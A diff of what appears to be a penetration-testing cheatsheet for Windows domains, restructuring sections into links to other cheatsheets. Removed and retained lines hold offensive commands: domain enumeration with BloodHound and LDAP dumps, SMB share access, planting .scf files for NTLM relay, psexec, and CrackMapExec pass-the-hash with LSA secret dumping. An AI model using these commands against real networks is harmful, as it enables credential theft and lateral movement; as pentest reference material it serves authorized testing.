@@ -139,33 +139,15 @@ python psexec.py '<user>:<pass>@<target>'
 
 ---
 
-### Domain enum
+### Local Privilege Escalation
 
-```bash
-enum4linux -a <target_dc> -u <USER> -p <PASSWORD> -d <domain>
-bloodhound.py -d <DOMAIN> -u <user> -p <password> -dc <FQDN-SERVER> -c all
-python ldapdomaindump.py -u '<domain>\<user>' -p '<pass>' <target>
-sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
-```
-> More details are available in the next cheatsheet Domain Escalation
+> For more details, see next cheatsheet : [Local Privilege Escalation Windows](03-lpe-windows.md)
 
 ---
 
-### SMB restricted shares
+### Domain Escalation
 
-```bash
-smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
-smbget -rR smb://<target>/<share>/ -U <user>
-smbclient \\\\<target>\\c$ -U <user>
-smbclient -L //<target> -U '<domain>\<user>`
-upload .ico .scf => Responder/NTLMrelayx
-```
-
----
-
-### Low Privilege Escalation
-
-See next cheatsheet LPE Windows or LPE Linux
+> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)
 
 ---
 
@@ -173,11 +155,11 @@ See next cheatsheet LPE Windows or LPE Linux
 
 ### Post-Exploitation
 
-See next cheatsheets Post-Ex Windows and Post-Ex Linux
+> For more details, see next cheatsheet : [Local Privilege Escalation Windows](05-post-exploitation-windows.md)
 
 ### Replay the secrets found
 
-LM/NTLM hash or cleartext password with CrackMapExec
+Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec
 
 ```bash
 crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
@@ -185,11 +167,11 @@ crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
 
 ### Pivoting
 
-See next cheatsheet Pivoting
+> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)
 
 ### Domain escalation
 
-See next cheatsheet Domain Escalation
+> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)
 
 ---
 
